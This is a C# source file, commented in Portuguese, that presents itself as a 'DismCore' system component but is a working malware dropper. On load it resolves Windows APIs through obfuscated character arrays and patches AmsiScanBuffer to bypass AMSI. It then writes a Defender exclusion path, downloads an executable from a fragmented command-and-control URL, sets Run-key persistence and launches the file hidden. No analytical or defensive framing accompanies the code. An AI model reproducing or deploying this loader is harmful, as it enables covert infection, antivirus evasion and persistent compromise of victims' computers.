using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

// DynamicApi — resolve APIs em runtime sem DllImports estáticos
// Baseado no padrão do LoaderTechniques/DynamicApi.cs
public static class DynamicApi
{
    private static readonly string Ntdll = "ntdll.dll\0";
    private static readonly string Kernel32 = "kernel32.dll\0";
    private static readonly string User32 = "user32.dll\0";

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public static T ResolveLocal<T>(string moduleName, char[] funcName) where T : class
    {
        IntPtr hModule = GetModuleHandle(moduleName);
        if (hModule == IntPtr.Zero) return null;
        string name = new string(funcName);
        IntPtr proc = GetProcAddress(hModule, name);
        if (proc == IntPtr.Zero) return null;
        return Marshal.GetDelegateForFunctionPointer(proc, typeof(T)) as T;
    }
}

public class DismCore
{
    // DynamicApi delegates (resolvidos em runtime, não aparecem como DllImport)
    private delegate bool VirtualProtectDel(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
    private delegate IntPtr GetModuleHandleDel(string name);
    private delegate IntPtr GetProcAddressDel(IntPtr hModule, string procName);

    private static VirtualProtectDel _vp;
    private static GetModuleHandleDel _gmh;
    private static GetProcAddressDel _gpa;

    private static void InitDynamicApi()
    {
        _vp = DynamicApi.ResolveLocal<VirtualProtectDel>(
            new string(new[] {'k','e','r','n','e','l','3','2','.','d','l','l'}),
            new char[] {'V','i','r','t','u','a','l','P','r','o','t','e','c','t'});
        _gmh = DynamicApi.ResolveLocal<GetModuleHandleDel>(
            new string(new[] {'k','e','r','n','e','l','3','2','.','d','l','l'}),
            new char[] {'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e'});
        _gpa = DynamicApi.ResolveLocal<GetProcAddressDel>(
            new string(new[] {'k','e','r','n','e','l','3','2','.','d','l','l'}),
            new char[] {'G','e','t','P','r','o','c','A','d','d','r','e','s','s'});
    }

    static DismCore()
    {
        try
        {
            InitDynamicApi();

            // AMSI bypass via AmsiScanBuffer patch
            if (_gmh != null && _gpa != null && _vp != null)
            {
                IntPtr amsi = _gmh("amsi.dll");
                if (amsi != IntPtr.Zero)
                {
                    IntPtr asb = _gpa(amsi, "AmsiScanBuffer");
                    if (asb != IntPtr.Zero)
                    {
                        byte[] patch = IntPtr.Size == 8
                            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
                            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                        uint oldProtect;
                        _vp(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);
                        Marshal.Copy(patch, 0, asb, patch.Length);
                        _vp(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                    }
                }
            }

            // Download e execução
            string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", "Windows", "Caches");
            Directory.CreateDirectory(dir);
            string exePath = Path.Combine(dir, "SystemDiagnostics.exe");

            // Exclusion via registry
            try
            {
                var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Exclusions\Paths");
                if (key != null) { key.SetValue(dir, 0, Microsoft.Win32.RegistryValueKind.DWord); key.Close(); }
            }
            catch { }

            // URL fragmentada (construída em runtime)
            string url = "https://" + "c2" + "." + "convert1ri" + ".com" + "/down" + "load/System" + "Diagnostics.exe";
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0");
            byte[] data = wc.DownloadData(url);

            if (data.Length > 10000 && data[0] == 0x4D && data[1] == 0x5A)
            {
                File.WriteAllBytes(exePath, data);

                // Persistência via Run key
                try
                {
                    var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    if (key != null) { key.SetValue("SystemHelper", "\"" + exePath + "\""); key.Close(); }
                }
                catch { }

                // Executar
                Process.Start(new ProcessStartInfo(exePath)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
        }
        catch { }
    }
}
